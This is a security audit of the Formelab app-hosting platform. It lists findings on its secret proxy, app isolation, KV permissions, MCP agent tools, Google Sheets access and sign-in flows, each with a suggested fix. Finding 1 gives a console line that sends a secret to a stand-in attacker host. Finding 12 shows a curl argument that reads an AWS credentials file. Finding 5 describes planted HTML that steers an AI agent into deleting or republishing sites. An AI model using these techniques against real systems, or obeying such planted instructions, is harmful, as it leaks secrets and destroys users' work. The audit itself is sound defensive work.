# Formelab security audit

Date: 2026-10-13. First pass at `4da43b0` (the old `main`); second pass at `cab70ba`, after the
Oct 9–13 work (WorkOS accounts, formelab.app, admin panel, Gemini, Google Sheets, emails) was merged.
Method: a manual read of the source. First-pass findings marked **Confirmed** were reproduced with
tests in the project's `vitest-pool-workers` harness. Second-pass findings (N1–N7) come from
reading the code only and are marked **Code read**.
`npm audit --omit=dev` reported 0 known vulnerabilities, and git history contains no committed credentials.

## Summary

| # | Severity | Finding | Status |
|---|---|---|---|
| 1 | **Critical** | Any viewer of an app can send its secrets to a server they control through the secret proxy | **Fixed** |
| 2 | **High** | All apps in a namespace share one origin, so apps aren't isolated from each other (restricted apps included) | Confirmed |
| 3 | **High** | App KV has no write permissions: any viewer can read, overwrite, wipe or fill an app's data | Confirmed |
| 4 | Medium | Untrusted app code is served from the same registrable domain as the web app (now `formelab.app` and `*.formelab.app`) | Design; see N4 |
| 5 | Medium | Indirect prompt injection: the MCP `fetch` tool gives other people's HTML to an agent that can also delete and publish | Design |
| 6 | Medium | Removing someone from Access doesn't cut off their deploy tokens or OAuth grants (up to 30 days) | **Mostly fixed**: admins can now delete a user, which revokes tokens, grants and sessions |
| 7 | Low | Proxy response redaction is easy to bypass | Confirmed |
| 8 | Low | Any viewer can use up an app's proxy rate limit and fill the unbounded audit table | Code read |
| 9 | Low | `GET /_api/kv` returns up to about 64 MB in one response | Code read |
| 10 | Low | Site editors (not owners) can make a restricted app public; namespace editors can delete the owner's apps | Design |
| 11 | Low | Anyone can claim any free namespace name first | Design |
| 12 | Low | `scripts/publish.sh` passes `--title` and `--allowed-emails` to `curl -F`, so a value starting with `@` uploads a local file | Code read |
| 13 | Info | `is_admin` is never revoked by `upsertUser` | Code read; admin access can now be removed from the admin panel |

### Second pass: new code (Oct 9–13)

| # | Severity | Finding | Status |
|---|---|---|---|
| N1 | **High** | Google Sheets: the owner's Google token covers every spreadsheet they own, and any viewer of any of their apps can use it on any spreadsheet | Code read |
| N2 | **High** | Open sign-up: waitlisted accounts count as "signed in", so apps set to `all` are open to anyone on the internet, including KV, secrets and the owner's Gemini and Sheets | Code read |
| N3 | Medium | The owner's Gemini and Sheets quotas can be used up by any viewer | Code read |
| N4 | Medium | The admin API works from the web app's 30-day session, and the web app is same-site with user apps | Code read |
| N5 | Medium | Sign-in hand-off codes aren't bound to the browser that asked for them (login CSRF) | Code read |
| N6 | Low | Return-path checks after sign-in miss some forms that browsers treat as another host (possible open redirect) | Code read, not tested |
| N7 | Low | Share emails go to any address with sender-chosen app titles, a possible spam or phishing relay | Code read; rate limits not checked |

---

## 1. Critical: secret exfiltration through the proxy

> **Fixed:** secrets now carry a required `hosts` allow-list (migration `0010`), and the proxy
> refuses any other host. Secrets saved before the fix are refused until they are set again.

**Where:** `src/runtime.ts:90-101`, `src/secrets.ts:240-296`

The proxy only requires `canViewSite`. For any app with `visibility: "all"` (the default), that
means every person allowed through Cloudflare Access. The caller chooses the URL and headers. The
SSRF guard only blocks private and platform hosts, so a viewer can send the secret to any public
host they like:

```js
// Run from the browser console on any app you can view
formelab.secrets.proxy("openai_key", { url: "https://attacker.example/c?k={{value}}" })
```

Redaction only cleans the response coming back to the browser. The attacker's server has already
received the secret in plaintext. Confirmed: the outbound request contained the full secret,
sent by a user with no role on the site.

**Fix:** bind each secret to its allowed hosts. The owner sets them with the secret (for example
`{ value, hosts: ["api.openai.com"] }`, stored in the encrypted blob or a new column). `proxy()`
then rejects any final URL whose hostname isn't on that list. Also consider:
- refusing placeholders in the scheme, host or port part of the URL;
- a per-secret switch for whether non-editors can use it at all.

## 2. High: no isolation between apps in a namespace

**Where:** `src/index.ts:76-94`, `src/runtime.ts:27-39`

Every app in a namespace is served from `https://<ns>.DOMAIN`. The runtime API picks the target
app from the `x-formelab-mount` header, which page JavaScript sets freely. As a result, JS in
`/public-app/` running in a visitor's browser can:

- `fetch("/private-app/")` and read a **restricted** sibling app's files whenever the visitor can see it;
- call `/_api/*` with `x-formelab-mount: /private-app/` to read and write its KV and list its secrets;
- use the sibling's secrets via the proxy, which combined with #1 leaks them to the attacker;
- if the visitor manages the sibling app, `PUT`/`DELETE` its secrets.

The `Origin` check doesn't help because the request is same-origin. Confirmed.

Who can do this: anyone who can put JS on any app in the namespace. That includes namespace
editors, editors of just one site, and any XSS or malicious third-party script in any app.

**Fix:** give each app its own origin (for example `<site>--<ns>.DOMAIN`, or one subdomain per site
ID), and resolve the runtime site from the host rather than a header. Short of that, document
clearly that "restricted" isn't a boundary between apps in the same namespace.

## 3. High: KV is world-writable for viewers

**Where:** `src/runtime.ts:59-66`

Reading, writing and deleting KV all need only view access. Confirmed: a user with no role read
every key of another owner's app, overwrote one, and deleted it. The same user can also write
1,000 junk keys, after which the app's real writes fail with `too_many_keys`.

**Fix:** split permissions. For example: reads for viewers; writes only for managers, or only
under a key prefix tied to the user (`user:<email>/...`); an opt-in "shared writable" flag per app.
At minimum, document that KV is shared, public and editable by every viewer.

## 4. Medium: user content is same-site with the control plane

App HTML, SVG and JS from any user is served with no CSP from `*.formelab.ai`. The dashboard,
`/authorize` and the admin API live at `formelab.ai`. These count as **same-site**, so:
- an app can set cookies scoped to `Domain=formelab.ai` (cookie tossing);
- `SameSite` cookies are sent on requests between them.

The existing defenses (Origin check, `x-formelab-request`, `__Host-` OAuth cookies) cover the
obvious attacks. Even so, the standard practice is to serve user content from a separate
registrable domain (for example `formelab.app`), the way github.io and googleusercontent.com do.
That change would also make #2 easier to fix.

## 5. Medium: indirect prompt injection via MCP

**Where:** `src/mcp.ts:193-232`

`fetch` returns up to 200 KB of any viewable app's `index.html`. Site IDs are visible to
everyone through `list_sites({namespace})`. The same token also carries `publish`, `update_site`
and `delete_site`, because there is one `mcp` scope. An attacker can publish a public app whose
HTML tells the agent to "delete the site X" or "republish Y with this script", then get a victim
to ask their assistant about it.

**Fix:**
- add a read-only scope, and grant write tools only with a separate scope;
- label fetched source as untrusted content in the tool result;
- consider requiring the caller to confirm `delete_site` by repeating its mount path.

## 6. Medium: offboarding gap

**Where:** `src/oauth.ts:46-58`, `src/auth.ts:116-128`

`/mcp` and `/_api/deploy/*` bypass Access. They only check that the user's row exists, and rows
are never deleted. A person removed from the Access policy keeps working deploy tokens and OAuth
grants for up to 30 days. `DECISIONS.md` already lists this as a known limitation.

**Fix:**
- add an admin-only "disable user" that sets a flag, checked in `getUser`/`userForDeployToken`, and revokes all of the user's tokens and grants;
- or shorten the refresh-token lifetime (`refreshTokenTTL`) and require a recent Access login at refresh.

## 7. Low: redaction is easy to bypass

**Where:** `src/secrets.ts:169-173`

Redaction only matches the exact value, and only values of 6+ characters. Confirmed: an upstream
that base64-encodes the echoed header returns the secret intact. URL-encoding or splitting the
value works too. Treat redaction as best-effort; the real control is #1's host allow-list.

## 8. Low: proxy and audit abuse

The proxy rate limit is per site (`src/secrets.ts:179`). Any viewer can use up the 60/min and
block the app's real users. Each proxy call also writes an audit row, and the `audit` table is
never pruned. **Fix:** also rate-limit per viewer per site, and add a retention job for `audit`.

## 9. Low: unbounded KV list

**Where:** `src/kv.ts:15-22`

`kvList` loads, parses and re-serializes every row: up to 1,000 × 64 KB. That gets close to the
Worker's 128 MB memory limit. **Fix:** paginate (`limit` + cursor) or cap the total bytes.

## 10. Low: permission edges

- `updateSite` and `publishSite` let **site editors** change `visibility` and `allowed_emails`. A
  co-editor can make a restricted app public or add themselves to its allow-list.
- **Namespace editors** can delete and replace the namespace owner's apps.

If that isn't intended, limit visibility/allow-list changes and deletes to owners.

## 11. Low: namespace squatting

Namespaces are claimed first-come by any Access user. Only six names are reserved
(`src/sites.ts:48`). Someone could claim `login`, `sso`, `hr`, `payroll` or a colleague's name and
host a convincing look-alike page. **Fix:** a larger reserved list, or admin approval for new
namespaces.

## 12. Low: `curl -F` file read in `scripts/publish.sh`

**Where:** `scripts/publish.sh:57-61`

With `-F "title=${title}"`, a value starting with `@` or `<` makes curl read a local file. For
example, `--title @~/.aws/credentials` puts the file's contents into a published title. This
matters when an agent passes in untrusted text. **Fix:** use `--form-string` for `title`,
`allowed_emails`, `namespace`, `mount_path` and `visibility`.

## 13. Info: sticky admin flag

`upsertUser` uses `MAX(users.is_admin, excluded.is_admin)` (`src/auth.ts:65`), so changing
`OWNER_EMAIL` never removes the old admin. Today `isAdmin` is only shown in the UI. If it ever
grants privileges, compute it from `OWNER_EMAIL` on every request instead.

---

## Second pass: new findings

### N1. High: Google Sheets access is all-or-nothing

**Where:** `src/sheets.ts`, `src/runtime.ts` (`/_api/sheets`)

Connecting Google Sheets stores a token with the `spreadsheets` scope, which covers every
spreadsheet in the owner's Google account. `sheetsCall` accepts any Sheets API path from any viewer
of any app the owner owns, so anyone who can open one of those apps can read, overwrite or
restructure any of the owner's spreadsheets whose ID they know, and create new ones. JavaScript
written by a site editor runs with the same access, so co-editors can do the same through the
owner's visitors. The path checks keep calls inside the Sheets API, but not inside the sheets the
app is meant to use.

**Fix:**
- switch to the `drive.file` scope, so Formelab only reaches spreadsheets it created or the person opened with it;
- keep an allow-list of spreadsheet IDs per app, set by the owner, and reject any other ID;
- consider allowing writes only for the app's owner and editors.

### N2. High: "all" now means anyone who signs up

**Where:** `src/auth.ts` (`canViewSite`), `src/login.ts`, `src/sites.ts`

WorkOS sign-in accepts any verified email and creates a session even for waitlisted accounts.
`user.active` is only checked when creating a namespace. `canViewSite` lets any signed-in user
open an app with `visibility: "all"`, and so use its KV, its secret proxy, and the owner's Gemini
and Sheets connections. New apps now default to `restricted`, which helps, but anything set to
`all` is effectively public.

**Fix:** require `user.active` in `canViewSite` (and in `/_api/*` on namespace hosts) for
`all` apps, unless the owner explicitly marks an app as public. Also rename "all" in the UI to
say who it really covers.

### N3. Medium: owner quotas can be used up by viewers

**Where:** `src/gemini.ts`, `src/sheets.ts`

Gemini and Sheets calls are limited to 60 per minute per app, not per viewer, and use the owner's
key. Any viewer can spend the owner's Gemini budget (up to 8,192 output tokens per call), across
every app the owner has. **Fix:** add a per-viewer limit and a per-owner daily cap, and let owners
turn connected services on per app.

The Gemini integration itself is well built: it only calls Google, with a fixed model, so the key
can't be redirected the way app secrets could before fix #1.

### N4. Medium: admin access from the web app session

**Where:** `src/index.ts` (`signedInHost`), `src/api.ts`

The admin panel has its own 8-hour sign-in, but the admin endpoints (`/_api/admin/users`,
`/users/:email/admin`, `/waitlist/approve`, `/features/:name`) are served by the same management
API on the web app host too, where an admin's session lasts 30 days. The shorter admin session
therefore isn't a real boundary. The web app (`formelab.app`) is also same-site with every
published app (`*.formelab.app`). `__Host-` cookies and the Origin and custom-header checks block
the obvious attacks, but this is the setup finding #4 warned about.

**Fix:** serve the admin endpoints only on the admin host. Move published apps to their own
registrable domain (for example `formelab-apps.com`, or `*.formelab.site`).

### N5. Medium: login CSRF through the hand-off code

**Where:** `src/login.ts` (`appHandoff`, `appCallback`)

`/_auth/callback?code=...` accepts any unexpired code minted for that host, from any browser. A
person can mint a code with their own session and send the link to someone else. Opening it signs
the victim's browser into the sender's account on `formelab.app` or an app host. Anything the
victim then enters (secrets, data, uploads) goes to the sender's account.

**Fix:** before redirecting to `/auth/app`, set a random nonce cookie on the target host. Include
the nonce in the code request, and refuse the callback unless the cookie matches.

### N6. Low: return-path checks

**Where:** `src/login.ts` (`safeReturn`, `appCallback`)

`safeReturn` rejects `//` and `/\`, but browsers also strip tabs and newlines from URLs. A value
like `/<tab>/example.net` could therefore be treated as another host. `appCallback` doesn't reject
`/\` at all. I haven't tested this. **Fix:** resolve the value with `new URL(value, origin)`
and accept it only if the resulting origin is unchanged.

### N7. Low: share emails as a relay

**Where:** `src/email.ts`, sharing in `src/sites.ts`

Adding someone to an app sends them an email from Formelab with the sharer's chosen app title and
a link to the app. Any active user can do this for arbitrary addresses. I didn't check for a rate
limit. **Fix:** a per-sender daily cap on share emails, and send them only to addresses that
already have accounts or are on the waitlist.

---

## What's done well

- All SQL is parameterized. The only dynamic SQL (`updateSite`) builds column names from a fixed list.
- The zip parser is careful: symlinks, `..` paths, ZIP64, encryption and reserved paths are all
  rejected, and decompression is checked against a running size budget, so zip bombs are stopped early.
- The SSRF guard is solid, with IPv4/IPv6 private, mapped, NAT64 and 6to4 forms blocked, plus
  `global_fetch_strictly_public`, manual redirects and the check running after substitution.
- Access JWTs are verified properly: RS256 only, `aud`/`iss`/`exp` checked, and the plain email
  header is never trusted. The dev bypass requires an exact `ENVIRONMENT === "dev"`.
- Deploy tokens are stored only as SHA-256 hashes, are 256-bit random, expire, and can't mint more tokens.
- Secrets use AES-256-GCM with a random IV and AAD bound to `site_id:name`.
- The admin API has CSRF protection (Origin check plus a custom header). The dashboard has a strict
  CSP with `frame-ancestors 'none'`, and output is escaped everywhere.
- The OAuth consent page uses browser-bound `__Host-` cookies, can't be framed, and has a tight `form-action`.
- No dependency CVEs, and no secrets in git history.

Second pass, also done well: sessions are `__Host-` cookies stored only as hashes and bound to
one host; app hosts get their own short sessions through single-use codes; user deletion removes
tokens, grants, sessions and connected services; dashboard templates escape everything; app icons
are served with a sandboxing CSP; Gemini can only reach Google.

## Suggested order of work

1. ~~#1: host allow-lists for secrets.~~ Done.
2. N1: limit Google Sheets access per app.
3. N2: keep waitlisted accounts out of apps.
4. #3: KV write permissions.
5. N5 and N6: bind hand-off codes to the browser; strict return paths.
6. N4, #2 and #4 together: admin endpoints on the admin host only, and published apps on their own domain.
7. N3 and N7: per-viewer and per-sender limits.
8. #5: read-only MCP scope.
9. The low findings as cleanup.
